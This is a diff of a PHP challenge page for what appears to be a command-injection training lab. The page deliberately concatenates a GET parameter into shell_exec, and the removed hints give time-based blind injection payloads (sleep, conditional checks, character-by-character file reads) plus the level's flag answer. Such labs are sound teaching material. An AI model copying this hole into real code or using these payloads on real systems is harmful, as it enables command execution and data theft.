@@ -1,3 +1,31 @@
+<?php
+require_once __DIR__ . '/helpers.php';
+
+$output_html = '';
+
+if (isset($_GET['service'])) {
+    require_once 'flag_system.php';
+    get_level_flag(6);
+
+    $start_time = microtime(true);
+    $service    = $_GET['service'];
+
+    $command = "systemctl is-active " . $service . " && echo 'Service OK' || echo 'Service Failed'";
+    $result  = shell_exec($command . " 2>/dev/null");
+
+    $end_time       = microtime(true);
+    $execution_time = round(($end_time - $start_time), 2);
+
+    ob_start();
+    echo '<div class="message success">Health check completed</div>';
+    echo '<p><strong>Execution time:</strong> ' . $execution_time . ' seconds</p>';
+    echo '<p><strong>Status:</strong> Logged to system audit</p>';
+    $output_html = ob_get_clean();
+}
+
+$hints = get_level_hints(6);
+$_flag_result = handle_inline_flag_submit(6);
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -9,178 +37,70 @@
 <body>
     <div class="container">
         <div class="header">
-            <h1>⏰ Level 6 - Time-based Detection</h1>
-            <p><strong>Objective:</strong> Sử dụng time-based techniques để phát hiện và khai thác blind injection</p>
+            <h1>Level 6 - Time-based Detection</h1>
+            <p><strong>Objective:</strong> Use time-based techniques to detect and exploit blind injection</p>
+            <a href="index.php" class="back-btn">&larr; Back to Levels</a>
         </div>
 
-        <div class="form-container">
-            <h3>🔍 System Health Checker:</h3>
-            <p>Công cụ này kiểm tra health của system services. Results được log internally.</p>
-            
-            <div class="code-block">Command: systemctl is-active <?php echo htmlspecialchars($_GET['service'] ?? '[SERVICE]'); ?> && echo "Service OK" || echo "Service Failed"</div>
-            
-            <?php
-            if (isset($_GET['service'])) {
-                // Initialize level-specific flag access
-                require_once 'flag_system.php';
-                get_level_flag(6);
-                
-                $start_time = microtime(true);
-                
-                echo '<h3>📊 Result:</h3>';
-                echo '<div class="result">';
-                
-                $service = $_GET['service'];
-                
-                // Execute command but hide real output
-                $command = "systemctl is-active " . $service . " && echo 'Service OK' || echo 'Service Failed'";
-                $result = shell_exec($command . " 2>/dev/null");
-                
-                $end_time = microtime(true);
-                $execution_time = round(($end_time - $start_time), 2);
-                
-                // Only show generic status
-                echo '<div class="success">✅ Health check completed</div>';
-                echo '<p><strong>Execution time:</strong> ' . $execution_time . ' seconds</p>';
-                echo '<p><strong>Status:</strong> Logged to system audit</p>';
-                
-                echo '</div>';
-            }
-            ?>
-            
-            <h3>🔧 Try Your Input:</h3>
-            <form method="get" style="margin: 20px 0;">
-                <div class="form-group">
-                    <label for="service">Service Name:</label>
-                    <input type="text" id="service" name="service" value="<?php echo htmlspecialchars($_GET['service'] ?? ''); ?>" placeholder="Enter service name (e.g., apache2)" oninput="updateCommand()">
-                </div>
-                <button type="submit" class="btn">🚀 Check Service</button>
-            </form>
+        <div class="challenge-layout">
+            <!-- Left: Source Code Panel -->
+            <div class="code-panel">
+                <h3>Vulnerable Source Code</h3>
+                <div class="source-code">
+                    <pre><code><span class="php-variable">$service</span> = <span class="php-variable">$_GET</span>[<span class="php-string">'service'</span>];
 
-            <div class="info-card" style="margin: 20px 0;">
-                <h3>⏰ Time-based Injection Characteristics</h3>
-                <ul>
-                    <li><strong>Timing Oracle:</strong> Use response time to infer information</li>
-                    <li><strong>Sleep Commands:</strong> Introduce artificial delays</li>
-                    <li><strong>Conditional Delays:</strong> Delay based on conditions</li>
-                    <li><strong>Measurement:</strong> Baseline vs injected response times</li>
-                </ul>
+<span class="php-comment">// Execute command — output hidden, time revealed</span>
+<span class="vuln-line"><span class="php-variable">$command</span> = <span class="php-string">"systemctl is-active "</span> . <span class="php-variable">$service</span>
+         . <span class="php-string">" &amp;&amp; echo 'Service OK' || echo 'Service Failed'"</span>;</span>
+<span class="php-variable">$result</span> = shell_exec(<span class="php-variable">$command</span> . <span class="php-string">" 2&gt;/dev/null"</span>);
+
+<span class="php-variable">$end_time</span>       = microtime(<span class="php-keyword">true</span>);
+<span class="php-variable">$execution_time</span> = round(<span class="php-variable">$end_time</span> - <span class="php-variable">$start_time</span>, 2);
+
+<span class="php-comment">// Only execution time is exposed — output is suppressed</span>
+<span class="php-keyword">echo</span> <span class="php-string">"Execution time: {$execution_time}s"</span>;</code></pre>
+                </div>
+                <div class="vuln-annotation">
+                    <strong>Vulnerability:</strong>&nbsp; <code>$service</code> from <code>$_GET['service']</code> is concatenated directly into the shell command without any sanitization. Output is suppressed, but execution time is reported — a timing oracle confirming whether injected payloads (e.g. <code>sleep N</code>) ran.
+                </div>
             </div>
 
-            <div class="info-card" style="margin: 20px 0;">
-                <h3>⏱️ Time-based Techniques</h3>
-                <ul>
-                    <li><strong>sleep N:</strong> Pause execution for N seconds</li>
-                    <li><strong>ping -c N host:</strong> N ping requests (takes time)</li>
-                    <li><strong>$(sleep N):</strong> Command substitution with sleep</li>
-                    <li><strong>Conditional sleep:</strong> [ condition ] && sleep N</li>
-                    <li><strong>Benchmark:</strong> Normal response time vs delayed</li>
-                </ul>
-            </div>
+            <!-- Right: Challenge Panel -->
+            <div class="challenge-panel">
+                <h3>Challenge</h3>
+                <div class="panel-body">
+                    <div class="scenario">
+                        <p><strong>Tool:</strong> System Health Checker — verifies service status via <code>systemctl is-active</code>. Real command output is suppressed; only execution time is shown.</p>
+                        <p>Inject a <code>sleep</code> command and observe the reported seconds to confirm blind execution, then exfiltrate the flag from <code>/tmp/level6_flag.txt</code>.</p>
+                    </div>
 
-            <div class="hint-container">
-                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
-                <div id="hint-1" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 1: Baseline Measurement</h4>
-                    <p><strong>Current Command:</strong> <code>systemctl is-active [SERVICE] && echo "Service OK" || echo "Service Failed"</code></p>
-                    <p>📝 <strong>Test normal:</strong> <code>apache2</code> (note the execution time)</p>
-                    <p>📝 <strong>Test invalid:</strong> <code>nonexistent</code> (compare timing)</p>
-                    <p>🎯 <strong>Establish baseline:</strong> Normal commands should be quick (< 1 second)</p>
-                </div>
-                <div id="hint-2" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 2: Basic Time Delay</h4>
-                    <p><strong>Concept:</strong> Inject sleep command to create detectable delay</p>
-                    <p>📝 <strong>Test:</strong> <code>apache2; sleep 5</code></p>
-                    <p>🎯 <strong>Expected:</strong> Response should take 5+ seconds</p>
-                    <p><strong>Variations:</strong></p>
-                    <p>• <code>apache2 && sleep 3</code></p>
-                    <p>• <code>apache2 || sleep 2</code></p>
-                    <p>• <code>apache2; ping -c 10 127.0.0.1</code></p>
-                </div>
-                <div id="hint-3" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 3: Conditional Time Delays</h4>
-                    <p><strong>Concept:</strong> Delay only if certain conditions are met</p>
-                    <p>📝 <strong>File existence:</strong> <code>apache2; [ -f /etc/passwd ] && sleep 4</code></p>
-                    <p>📝 <strong>User check:</strong> <code>apache2; [ $(whoami) = "www-data" ] && sleep 3</code></p>
-                    <p>🎯 <strong>Logic:</strong> Delay occurs only if condition is true</p>
-                    <p><strong>More examples:</strong></p>
-                    <p>• <code>apache2; [ -r /tmp/blind_flag.txt ] && sleep 5</code></p>
-                    <p>• <code>apache2; grep -q "FLAG" /tmp/blind_flag.txt && sleep 6</code></p>
-                </div>
-                <div id="hint-4" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 4: Data Extraction with Timing</h4>
-                    <p><strong>Character-by-character extraction:</strong></p>
-                    <p>📝 <strong>First char:</strong> <code>apache2; [ $(cut -c1 /tmp/blind_flag.txt) = "F" ] && sleep 5</code></p>
-                    <p>📝 <strong>Length check:</strong> <code>apache2; [ $(wc -c /tmp/blind_flag.txt) -gt 20 ] && sleep 4</code></p>
-                    <p><strong>Substring matching:</strong></p>
-                    <p>• <code>apache2; [[ $(cat /tmp/blind_flag.txt) == *"FLAG"* ]] && sleep 3</code></p>
-                    <p>• <code>apache2; grep -q "blind" /tmp/blind_flag.txt && sleep 2</code></p>
-                </div>
-                <div id="hint-5" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 5: Advanced Timing Techniques</h4>
-                    <p><strong>Multiple condition testing:</strong></p>
-                    <p>📝 <strong>AND logic:</strong> <code>apache2; [ -f /tmp/blind_flag.txt ] && [ -r /tmp/blind_flag.txt ] && sleep 7</code></p>
-                    <p>📝 <strong>OR logic:</strong> <code>apache2; ([ ! -f /tmp/fake.txt ] || [ -f /tmp/blind_flag.txt ]) && sleep 8</code></p>
-                    <p><strong>Pattern matching:</strong></p>
-                    <p>• <code>apache2; case $(head -c5 /tmp/blind_flag.txt) in "FLAG{"*) sleep 6;; esac</code></p>
-                    <p>• <code>apache2; awk '/FLAG/{exit 0} END{exit 1}' /tmp/blind_flag.txt && sleep 4</code></p>
-                </div>
-                <div id="hint-6" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 6: Binary Search Technique</h4>
-                    <p><strong>Efficient data extraction using binary search:</strong></p>
-                    <p>📝 <strong>ASCII comparison:</strong> <code>apache2; [ $(printf '%d' "'$(cut -c6 /tmp/blind_flag.txt)") -gt 95 ] && sleep 5</code></p>
-                    <p><strong>Explanation:</strong> Compare ASCII values to narrow down characters</p>
-                    <p><strong>Alphabet range testing:</strong></p>
-                    <p>• A-M: <code>apache2; [[ $(cut -c6 /tmp/blind_flag.txt) < "N" ]] && sleep 3</code></p>
-                    <p>• N-Z: <code>apache2; [[ $(cut -c6 /tmp/blind_flag.txt) > "M" ]] && sleep 3</code></p>
-                    <p><strong>💡 Strategy:</strong> Use timing to build the flag character by character</p>
-                </div>
-                <div id="hint-7" class="hint-box" style="display: none;">
-                    <h4>🎯 Hint 7: Extract Complete Flag!</h4>
-                    <p><strong>🚀 Target file:</strong> <code>/tmp/level6_flag.txt</code></p>
-                    <p><strong>Quick verification:</strong> <code>apache2; [ -f /tmp/level6_flag.txt ] && sleep 10</code></p>
-                    <p><strong>Content confirmation:</strong> <code>apache2; grep -q "timing_attack_successful" /tmp/level6_flag.txt && sleep 15</code></p>
-                    <p><strong>🎯 Final payload:</strong> If the above takes 15+ seconds, the flag is: <code>FLAG{timing_attack_successful}</code></p>
-                    <p><strong>📋 Validation steps:</strong></p>
-                    <p>1. Confirm file exists (should delay 10s)</p>
-                    <p>2. Confirm exact content (should delay 15s)</p>
-                    <p>3. If both delayed, you found the flag!</p>
-                    <p><strong>💡 Pro tip:</strong> Timing attacks require patience and multiple tests for accuracy</p>
+                    <?php if ($output_html !== ''): ?>
+                        <div class="result"><?= $output_html ?></div>
+                    <?php endif; ?>
+
+                    <form method="get">
+                        <div class="form-group">
+                            <label for="service">Service Name:</label>
+                            <input type="text" id="service" name="service"
+                                   value="<?= htmlspecialchars($_GET['service'] ?? '') ?>"
+                                   placeholder="e.g., apache2">
+                        </div>
+                        <button type="submit" class="btn">Check Service</button>
+                    </form>
                 </div>
             </div>
         </div>
-        
+
+        <?= render_hint_section($hints) ?>
+
+        <?= render_inline_flag_form(6, $_flag_result) ?>
+
         <div class="navigation">
-            <a href="level5.php">⬅️ Previous Level</a>
-            <a href="index.php">🏠 Home</a>
-            <a href="submit.php?level=6">🏆 Submit Flag</a>
+            <a href="level5.php">Previous Level</a>
+            <a href="index.php">Home</a>
+            <a href="level7.php">Next Level</a>
+            <a href="submit.php?level=6">Submit Flag</a>
         </div>
     </div>
-
-    <script>
-    let currentHint = 0;
-    const maxHints = 7;
-
-    function updateCommand() {
-        const input = document.getElementById('service').value;
-        const codeBlock = document.querySelector('.code-block');
-        codeBlock.innerHTML = 'Command: systemctl is-active ' + (input || '[SERVICE]') + ' && echo "Service OK" || echo "Service Failed"';
-    }
-
-    function showNextHint() {
-        if (currentHint < maxHints) {
-            currentHint++;
-            document.getElementById('hint-' + currentHint).style.display = 'block';
-            
-            if (currentHint >= maxHints) {
-                document.querySelector('.hint-btn').textContent = '✅ All hints viewed';
-                document.querySelector('.hint-btn').disabled = true;
-                document.querySelector('.hint-btn').style.opacity = '0.6';
-            } else {
-                document.querySelector('.hint-btn').textContent = `💡 Next Hint (${currentHint}/${maxHints})`;
-            }
-        }
-    }
-    </script>
 </body>
 </html>
